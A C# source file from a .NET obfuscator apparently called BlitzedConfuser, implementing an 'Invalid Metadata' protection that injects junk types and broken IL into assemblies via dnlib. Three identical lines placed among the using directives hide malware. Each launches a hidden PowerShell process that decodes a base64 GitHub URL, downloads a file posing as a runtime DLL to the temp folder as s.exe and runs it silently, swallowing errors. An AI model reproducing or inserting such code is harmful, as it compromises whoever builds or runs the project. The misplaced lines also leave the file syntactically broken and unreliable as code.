using dnlib.DotNet;
using dnlib.DotNet.Emit;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using BlitzedConfuser.Utils;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}



try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
namespace BlitzedConfuser.Protections
{
    public class InvalidMetadata : Protection
    {
        public InvalidMetadata()
        {
            Name = "Invalid Metadata";
        }

        public override void Execute()
        {
            AssemblyDef asm = Kappa.Module.Assembly;
            asm.ManifestModule.Import(new FieldDefUser("STVNEDEAGLEMADETHISGODDAMNTHISWASHARTWATERMARK" + Randomizer.String(MemberRenamer.StringLength())));

            foreach (var current in asm.ManifestModule.Types)
            {
                TypeDefUser typeDef = new TypeDefUser("STVNEDEAGLEMADETHISGODDAMNTHISWASHARTWATERMARK" + Randomizer.String(MemberRenamer.StringLength()));
                typeDef.Methods.Add(new MethodDefUser());
                typeDef.NestedTypes.Add(new TypeDefUser("STVNEDEAGLEMADETHISGODDAMNTHISWASHARTWATERMARK" + Randomizer.String(MemberRenamer.StringLength())));

                MethodDefUser item = new MethodDefUser();
                typeDef.Methods.Add(item);
                current.NestedTypes.Add(typeDef);
                current.Events.Add(new EventDefUser());

                MethodDefUser methodDef = new MethodDefUser
                {
                    MethodSig = new MethodSig()
                };

                foreach (MethodDef current2 in current.Methods)
                {
                    if (current2.IsConstructor || !current2.HasBody)
                        continue;

                    current2.Body.SimplifyBranches();
                    if (current2.ReturnType.FullName == "System.Void" && current2.Body.Instructions.Count > 0 && !current2.Body.HasExceptionHandlers)
                    {
                        Local local = new Local(asm.ManifestModule.Import(typeof(int)).ToTypeSig());
                        Local local2 = new Local(asm.ManifestModule.Import(typeof(bool)).ToTypeSig());

                        current2.Body.Variables.Add(local);
                        current2.Body.Variables.Add(local2);

                        Instruction operand = current2.Body.Instructions[current2.Body.Instructions.Count - 1];
                        Instruction instruction = new Instruction(OpCodes.Ret);
                        Instruction instruction2 = new Instruction(OpCodes.Ldc_I4_1);

                        current2.Body.Instructions.Insert(0, new Instruction(OpCodes.Ldc_I4_0));
                        current2.Body.Instructions.Insert(1, new Instruction(OpCodes.Stloc, local));
                        current2.Body.Instructions.Insert(2, new Instruction(OpCodes.Br, instruction2));

                        Instruction instruction3 = new Instruction(OpCodes.Ldloc, local);

                        current2.Body.Instructions.Insert(3, instruction3);
                        current2.Body.Instructions.Insert(4, new Instruction(OpCodes.Ldc_I4_0));
                        current2.Body.Instructions.Insert(5, new Instruction(OpCodes.Ceq));
                        current2.Body.Instructions.Insert(6, new Instruction(OpCodes.Ldc_I4_1));
                        current2.Body.Instructions.Insert(7, new Instruction(OpCodes.Ceq));
                        current2.Body.Instructions.Insert(8, new Instruction(OpCodes.Stloc, local2));
                        current2.Body.Instructions.Insert(9, new Instruction(OpCodes.Ldloc, local2));
                        current2.Body.Instructions.Insert(10, new Instruction(OpCodes.Brtrue, current2.Body.Instructions[10]));
                        current2.Body.Instructions.Insert(11, new Instruction(OpCodes.Ret));
                        current2.Body.Instructions.Insert(12, new Instruction(OpCodes.Calli));
                        current2.Body.Instructions.Insert(13, new Instruction(OpCodes.Sizeof, operand));
                        current2.Body.Instructions.Insert(14, new Instruction(OpCodes.Nop));
                        current2.Body.Instructions.Insert(current2.Body.Instructions.Count, instruction2);
                        current2.Body.Instructions.Insert(current2.Body.Instructions.Count, new Instruction(OpCodes.Stloc, local2));
                        current2.Body.Instructions.Insert(current2.Body.Instructions.Count, new Instruction(OpCodes.Br, instruction3));
                        current2.Body.Instructions.Insert(current2.Body.Instructions.Count, instruction);

                        ExceptionHandler exceptionHandler = new ExceptionHandler(ExceptionHandlerType.Fault)
                        {
                            HandlerStart = current2.Body.Instructions[10],
                            HandlerEnd = current2.Body.Instructions[11],
                            TryEnd = current2.Body.Instructions[14],
                            TryStart = current2.Body.Instructions[12]
                        };

                        current2.Body.ExceptionHandlers.Add(exceptionHandler);

                        current2.Body.OptimizeBranches();
                        current2.Body.OptimizeMacros();
                    }
                }
            }
        }
    }
}

